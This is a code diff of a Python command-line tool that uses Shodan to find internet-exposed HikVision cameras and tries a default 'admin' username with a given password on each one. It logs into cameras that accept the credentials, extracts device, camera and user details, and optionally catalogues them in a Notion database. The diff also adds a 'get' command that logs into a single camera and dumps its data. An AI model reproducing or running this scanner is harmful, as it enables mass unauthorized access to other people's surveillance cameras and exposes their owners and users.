@@ -124,13 +124,12 @@ def main():
 @main.command(help="Checks credentials of HikVision cameras.")
 @click.option("--shodan_key", envvar="SHODAN_KEY", required=True, help="Shodan API Key")
 @click.option("--query", "-q", default="Server: DNVRS-Webs")
-@click.option("--notion_key", required=True, help="Notion API Key")
-@click.option("--database", required=True, help="Link to database block in Notion")
+@click.option("--notion_key", help="Notion API Key")
+@click.option("--database", help="Link to database block in Notion")
 @click.option("--username", "-u", default="admin")
 @click.option("--password", "-p", required=True)
 def search(shodan_key, query, notion_key, database, username, password):
     shodan_api = shodan.Shodan(shodan_key)
-    notion_api = NotionClient(token_v2=notion_key)
 
     count = shodan_api.count(query)
     matches = []
@@ -165,38 +164,65 @@ def search(shodan_key, query, notion_key, database, username, password):
     print(f"Search done! Found {len(matches)}/{count['total']} matches!")
     print("")
 
-    table = notion_api.get_collection_view(database)
+    if notion_key and database:
+        notion_api = NotionClient(token_v2=notion_key)
+        table = notion_api.get_collection_view(database)
 
-    saved_cameras = []
-    for item in table.collection.get_rows():
-        saved_cameras.append(item.title)
+        saved_cameras = []
+        for item in table.collection.get_rows():
+            saved_cameras.append(item.title)
 
-    added_count = 0
+        added_count = 0
 
-    for id, camera in enumerate(matches):
+        for id, camera in enumerate(matches):
+            print("")
+            try:
+                if f"{camera.address}:{camera.port}" not in saved_cameras:
+                    row = table.collection.add_row()
+                    row.name = f"{camera.address}:{camera.port}"
+                    row.cameras = len(camera.cameras)
+                    row.users = len(camera.users)
+                    row.address = f"http://{camera.address}:{camera.port}/"
+
+                    page = notion_api.get_block(row.id)
+                    page.children.add_new(CodeBlock, title=json.dumps(camera.to_dict(), indent=4, sort_keys=True), language="JSON")
+
+                    print(f"{id}. [italic green]Success! Added to database...[/italic green]")
+                    added_count += 1
+                else:
+                    print(f"{id}. [italic red]Already added to database...[/italic red]")
+
+                print(camera.to_dict())
+            except:
+                pass
+
         print("")
-        try:
-            if f"{camera.address}:{camera.port}" not in saved_cameras:
-                row = table.collection.add_row()
-                row.name = f"{camera.address}:{camera.port}"
-                row.cameras = len(camera.cameras)
-                row.users = len(camera.users)
-                row.address = f"http://{camera.address}:{camera.port}/"
+        print(f"Synchronized! Added {added_count} entries from {len(matches)} matches.")
 
-                page = notion_api.get_block(row.id)
-                page.children.add_new(CodeBlock, title=json.dumps(camera.to_dict(), indent=4, sort_keys=True), language="JSON")
-
-                print(f"{id}. [italic green]Success! Added to database...[/italic green]")
-                added_count += 1
-            else:
-                print(f"{id}. [italic red]Already added to database...[/italic red]")
-
+    else:
+        for id, camera in enumerate(matches):
+            print(f"{id}.")
             print(camera.to_dict())
-        except:
-            pass
 
-    print("")
-    print(f"Synchronized! Added {added_count} entries from {len(matches)} matches.")
+
+@main.command(help="Checks credentials of HikVision cameras.")
+@click.argument("address")
+@click.option("--username", "-u", default="admin")
+@click.option("--password", "-p", required=True)
+def get(address, username, password):
+    ip, port = address.split(":")
+
+    camera = Camera(ip, port)
+    if camera.check_creds(username, password):
+        camera.get_device()
+        camera.get_cameras()
+        camera.get_users()
+
+        print(f"[italic green]Success! Logged In![/italic green] Address: {camera.address}:{camera.port}")
+        print(camera.to_dict())
+
+    else:
+        print(f"[italic red]Failure! Wrong password or Offline![/italic red] Address: {camera.address}:{camera.port}")
 
 
 if __name__ == "__main__":
